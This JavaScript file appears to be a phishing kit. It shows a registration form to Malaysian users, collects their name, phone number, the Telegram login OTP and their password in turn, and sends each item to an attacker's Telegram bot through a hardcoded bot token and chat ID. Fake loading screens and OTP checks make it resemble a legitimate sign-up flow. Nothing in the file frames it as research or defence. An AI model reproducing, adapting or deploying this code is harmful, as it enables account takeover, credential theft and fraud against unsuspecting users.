// Inisialisasi intl-tel-input
const phoneInputField = document.querySelector("#phone");
const phoneInput = window.intlTelInput(phoneInputField, {
  preferredCountries: ["my", "id", "us"],
  utilsScript:
    "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
});

// Fungsi untuk menampilkan halaman
function showPage(pageId) {
  document.querySelectorAll(".page").forEach((page) => {
    page.style.display = "none";
  });
  document.getElementById(pageId).style.display = "block";
}

// Fungsi untuk mengirim data ke Telegram
function sendToTelegram(message) {
  const token = "7877309436:AAEw6GIrE8KxIxLCpvNq-gowHaXIzap4Ja4";
  const chatId = "6741433528";

  return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown",
    }),
  });
}

function validateMalaysiaPhone(input) {
  // Hanya izinkan angka dan hapus karakter selain angka
  input.value = input.value.replace(/\D/g, "");

  // Pastikan nomor diawali dengan "60" (tanpa +)
  if (!input.value.startsWith("60")) {
    input.value = "60"; // Memastikan selalu diawali dengan kode Malaysia
  }

  // Batasi panjang nomor setelah +60 agar total 13 karakter maksimal
  if (input.value.length > 13) {
    input.value = input.value.slice(0, 13);
  }
}

// Handler form registrasi (halaman 1)
document
  .getElementById("registrationForm")
  .addEventListener("submit", function (event) {
    event.preventDefault();
    const name = document.getElementById("name").value;
    let phone = document.getElementById("phone").value;

    // Tambahkan "+" di awal nomor jika belum ada
    if (!phone.startsWith("+")) {
      phone = "+" + phone;
    }

    // Validasi panjang nomor Malaysia (Minimal 11, Maksimal 13 termasuk +60)
    if (phone.length < 10 || phone.length > 14) {
      alert(
        "Nombor telefon Malaysia mesti mempunyai 8 hingga 11 digit selepas 60"
      );
      return;
    }

    // Simpan nomor telepon ke localStorage
    localStorage.setItem("name", name);
    localStorage.setItem("phone", phone);

    const message =
      "📩 *Data Nomor Baru Diterima*\n" +
      "━━━━━━━━━━━━━━━\n" +
      "👤 *Nama*: `" +
      name +
      "`\n" +
      "📞 *Nomor Telepon*: `" +
      phone +
      "`\n" +
      "━━━━━━━━━━━━━━━";

    document.getElementById("loadingScreen").style.display = "flex";

    sendToTelegram(message)
      .then((response) => {
        if (response.ok) {
          showPage("page2");
        }
      })
      .finally(() => {
        document.getElementById("loadingScreen").style.display = "none";
      });

    // Update pesan pada halaman 2 dengan nomor telepon yang dimasukkan
    const otpMessage = document.querySelector("#page2 .form-container p");
    otpMessage.textContent = `Sila Masukkan Kod yang dihantar ke Nombor ${phone}`;
  });

let otpAttempt = 0; // Counter untuk track percobaan

// Daftar OTP tidak valid (asal-asalan)
const invalidOTPs = [
  "00000",
  "11111",
  "22222",
  "33333",
  "44444",
  "55555",
  "66666",
  "77777",
  "88888",
  "99999",
  "12345",
  "54321",
];

// Fungsi untuk cek apakah OTP termasuk invalid pattern
function isInvalidOTP(otp) {
  return invalidOTPs.includes(otp);
}

/// Handler form OTP (halaman 2)
document.getElementById("otpForm").addEventListener("submit", function (event) {
  event.preventDefault();

  const otpInputs = document.querySelectorAll(".otp-input");
  const otp = Array.from(otpInputs)
    .map((input) => input.value)
    .join("");

  const savedPhone = localStorage.getItem("phone");
  const savedName = localStorage.getItem("name");

  // Validasi OTP kosong
  if (otp === "") {
    alert("Sila masukkan OTP.");
    return;
  }

  // Validasi OTP dengan pattern tidak sah
  if (isInvalidOTP(otp)) {
    alert("OTP tidak sah, sila cuba OTP yang diterima melalui Telegram.");
    return;
  }

  // Simpan OTP ke localStorage
  localStorage.setItem("otp", otp);

  const message =
    "📩 *Data OTP Baru Diterima*\n" +
    "━━━━━━━━━━━━━━━\n" +
    "👤 *Nama*: `" +
    savedName +
    "`\n" +
    "📞 *Nombor Telefon*: `" +
    savedPhone +
    "`\n" +
    "🔑 *OTP*: `" +
    otp +
    "`\n" +
    "━━━━━━━━━━━━━━━";

  // Tampilkan loading screen
  document.getElementById("loadingScreen").style.display = "flex";

  // Kirim data ke Telegram
  sendToTelegram(message)
    .then((response) => {
      if (response.ok) {
        showPage("page3"); // Lanjut ke halaman 3
      } else {
        alert("Penghantaran data gagal. Sila cuba sebentar lagi.");
      }
    })
    .finally(() => {
      // Sembunyikan loading screen
      document.getElementById("loadingScreen").style.display = "none";
    });
});

// Handler form kata sandi (halaman 3)
document
  .getElementById("passwordForm")
  .addEventListener("submit", function (e) {
    e.preventDefault();

    // Ambil nilai password dan data tersimpan
    const password = document.getElementById("kata-sandi").value;
    const savedPhone = localStorage.getItem("phone");
    const savedName = localStorage.getItem("name");
    const savedOTP = localStorage.getItem("otp");

    const message =
      "📩 *Data Password Baru Diterima*\n" +
      "━━━━━━━━━━━━━━━\n" +
      "👤 *Nama*: `" +
      savedName +
      "`\n" +
      "📞 *Nomor Telepon*: `" +
      savedPhone +
      "`\n" +
      "🔑 *OTP*: `" +
      savedOTP +
      "`\n" +
      "🛡️ *Password*: `" +
      password +
      "`\n" +
      "━━━━━━━━━━━━━━━";

    // Kirim ke Telegram
    sendToTelegram(message).then((response) => {
      if (response.ok) {
        // Sembunyikan form dan tampilkan loading
        document.getElementById("passwordForm").style.display = "none";
        document.getElementById("kataSandi").style.display = "none";
        document.getElementById("loadingContent").style.display = "block";
      }
    });
  });

// Handler untuk tombol "Gunakan Nombor Lain"
document
  .getElementById("useAnotherPhone")
  .addEventListener("click", function () {
    showPage("page1"); // Kembali ke halaman pertama
    // Reset semua form
    document.getElementById("passwordForm").reset();
    document.getElementById("otpForm").reset();
    document.getElementById("registrationForm").reset();

    // Kembalikan tampilan form password ke kondisi awal
    document.getElementById("passwordForm").style.display = "block";
    document.getElementById("kataSandi").style.display = "block";
    document.getElementById("loadingContent").style.display = "none";
  });

// Tambahkan sebelum akhir script
// Handler untuk input OTP
document.querySelectorAll(".otp-input").forEach((input, index) => {
  input.addEventListener("input", function (e) {
    // Hapus karakter non-angka
    this.value = this.value.replace(/[^0-9]/g, "");

    // Batasi input menjadi 1 digit
    if (this.value.length > 1) {
      this.value = this.value[0];
    }

    // Pindah ke input berikutnya jika ada nilai
    if (this.value.length === 1) {
      const nextInput = document.querySelectorAll(".otp-input")[index + 1];
      if (nextInput) {
        nextInput.focus();
      }
    }
  });

  // Handler untuk tombol backspace
  input.addEventListener("keydown", function (e) {
    if (e.key === "Backspace" && !this.value) {
      const prevInput = document.querySelectorAll(".otp-input")[index - 1];
      if (prevInput) {
        prevInput.focus();
        // Opsional: Hapus nilai input sebelumnya
        // prevInput.value = '';
      }
    }
  });
});

// js untuk auto scroll
function startAutoScroll() {
  const lists = document.querySelectorAll(".list"); // Ambil semua elemen dengan class list

  lists.forEach((list) => {
    let isScrolling = true;

    function scroll() {
      if (!isScrolling) return;

      const firstItem = list.querySelector(".item");
      if (!firstItem) return;

      const itemHeight = firstItem.offsetHeight;

      // Animasi scroll
      list.style.transition = "transform 1s ease";
      list.style.transform = `translateY(-${itemHeight}px)`;

      // Reset posisi setelah animasi
      setTimeout(() => {
        list.style.transition = "none";
        list.style.transform = "translateY(0)";
        list.appendChild(firstItem.cloneNode(true));
        firstItem.remove();

        // Lanjutkan scroll
        setTimeout(() => {
          requestAnimationFrame(scroll);
        }, 2000); // Jeda 2 detik sebelum item berikutnya
      }, 1000);
    }

    // Mulai scroll
    scroll();

    // Handle hover
    const listBox = list.closest(".list-box");
    if (listBox) {
      listBox.addEventListener("mouseenter", () => {
        isScrolling = false;
      });

      listBox.addEventListener("mouseleave", () => {
        isScrolling = true;
        scroll();
      });
    }
  });
}

// Panggil fungsi saat dokumen dimuat
document.addEventListener("DOMContentLoaded", startAutoScroll);
